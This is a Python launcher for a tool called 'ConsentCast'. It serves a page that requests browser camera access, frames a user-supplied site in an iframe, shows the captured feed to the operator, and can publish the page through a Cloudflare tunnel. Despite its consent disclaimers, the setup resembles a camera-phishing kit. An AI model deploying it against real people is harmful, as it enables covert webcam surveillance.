import colorama
from colorama import Fore, Style
from urllib.parse import urlparse
import os
import sys
import subprocess
import re
import threading
import queue
import time
from cam import app

colorama.init()
TOOL_NAME = "ConsentCast"
HOST = "127.0.0.1"
PORT = 5000


def show_banner():
    print(Fore.CYAN + r"""
   _____                 _            _____           _
  / ____|               | |          / ____|         | |
 | |     ___  _ __  ___ | |_        | |     __ _ ___ | |_ 
 | |    / _ \| '_ \/ __|| __|       | |    / _` / __|| __|
 | |___|  __/| | | \__ \| |_        | |___| (_| \__ \| |_ 
  \_____\___||_| |_|___/ \__|        \_____|\__,_|___/\__|

       Cybersecurity Awareness Demo
       Made by: Zaim Sheali
       GitHub: github.com/zaim-tech | Instagram: @king_zaim001
""" + Style.RESET_ALL)
    print(Fore.YELLOW + "Use only with informed consent and on systems you own." + Style.RESET_ALL)
    print(Fore.YELLOW + "Camera permission is always requested by the browser." + Style.RESET_ALL)
    print(Fore.YELLOW + "This tool is for educational purposes only." + Style.RESET_ALL)
    print(Fore.YELLOW + "Do not use this tool for illegal or unethical activities. For illegal activities author is not responsible." + Style.RESET_ALL)
    print()

def is_termux():
    
    if sys.platform == 'android':
        return True
        
    
    if 'TERMUX_VERSION' in os.environ:
        return True
        
    
    if 'com.termux' in os.environ.get('PREFIX', ''):
        return True
        
    return False

def cloudflare_tunnel():
    cmd = ["cloudflared", "tunnel", "--url", f"http://{HOST}:{PORT}"]
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except FileNotFoundError:
        print(Fore.RED + "cloudflared was not found. Install it, then try again." + Style.RESET_ALL)
        return

    output = queue.Queue()
    reader = threading.Thread(
        target=lambda: [output.put(line) for line in process.stdout],
        daemon=True,
    )
    reader.start()
    url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')

    try:
        while process.poll() is None:
            try:
                line = output.get(timeout=0.2)
            except queue.Empty:
                continue
            match = url_pattern.search(line)
            if match:
                print(Fore.GREEN + "Cloudflare Tunnel URL: " + match.group(0) + Style.RESET_ALL)
                sys.stdout.flush()
        process.wait()

    except KeyboardInterrupt:
        print(Fore.YELLOW + "Stopping Cloudflare Tunnel..." + Style.RESET_ALL)
    finally:
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()
        print(Fore.YELLOW + "Cloudflare Tunnel stopped." + Style.RESET_ALL)

def install_cloudflared():
    if is_termux():
        print(Fore.YELLOW + "Installing cloudflared for Termux..." + Style.RESET_ALL)
        os.system("pkg install cloudflared -y")
        

    if sys.platform.startswith('linux'):
        print(Fore.YELLOW + "Installing cloudflared for Linux..." + Style.RESET_ALL)
        os.system("sudo apt install cloudflared -y")

    elif sys.platform == 'win32':
        print(Fore.YELLOW + "Installing cloudflared for Windows..." + Style.RESET_ALL)
        os.system("winget install --id cloudflare.cloudflared") 

    else:
        print(Fore.RED + "Unsupported platform. Please install cloudflared manually." + Style.RESET_ALL)
        return


def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_banner()
        print(Fore.CYAN + "Please select an option:" + Style.RESET_ALL)
        print(Fore.CYAN + "1. Start ConsentCast" + Style.RESET_ALL)
        print(Fore.CYAN + "2. Install Cloudflared" + Style.RESET_ALL)
        print(Fore.CYAN + "3. Exit" + Style.RESET_ALL)

        choice = input(Fore.MAGENTA + "Enter your choice (1, 2, or 3): " + Style.RESET_ALL).strip()

        if choice == '1':
            print(Fore.GREEN + "Starting ConsentCast..." + Style.RESET_ALL)
            url = input(Fore.MAGENTA + "Enter the URL to display in the iframe: " + Style.RESET_ALL).strip()
            parsed = urlparse(url)
            if parsed.scheme not in {"http", "https"} or not parsed.netloc:
                print(Fore.RED + "Please enter a valid http:// or https:// URL." + Style.RESET_ALL)
                continue

            
            app.config["IFRAME_URL"] = url
            print(Fore.GREEN + "In order to see the live camera feed, open [http://127.0.0.1:5000/cam](http://127.0.0.1:5000/cam) in your browser." + Style.RESET_ALL)
            print(Fore.GREEN + "Open http://127.0.0.1:5000/ to grant camera permission." + Style.RESET_ALL)
            print()
            print(Fore.YELLOW + "1. Cloudflare Tunnel." + Style.RESET_ALL)
            print(Fore.YELLOW + "2. Localhost only." + Style.RESET_ALL)
            tunnel_choice = input(Fore.MAGENTA + "Enter your choice (1 or 2): " + Style.RESET_ALL).strip()

            if tunnel_choice == '1':
                print(Fore.GREEN + "Starting Cloudflare Tunnel..." + Style.RESET_ALL)
                server_thread = threading.Thread(
                    target=app.run,
                    kwargs={"host": HOST, "port": PORT, "threaded": True},
                    daemon=True,
                )
                server_thread.start()
                cloudflare_tunnel()
                return
            elif tunnel_choice == '2':
                print(Fore.GREEN + "Starting local server..." + Style.RESET_ALL)
                app.run(host=HOST, port=PORT, threaded=True)
            else:
                print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
                input(Fore.YELLOW + "Press Enter to continue..." + Style.RESET_ALL)
                continue
            
            
        elif choice == '2':
            install_cloudflared()
            input(Fore.YELLOW + "Press Enter to return to the menu..." + Style.RESET_ALL)
        elif choice == '3':
            print(Fore.RED + "Exiting..." + Style.RESET_ALL)
            return
        else:
            print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
            input(Fore.YELLOW + "Press Enter to continue..." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
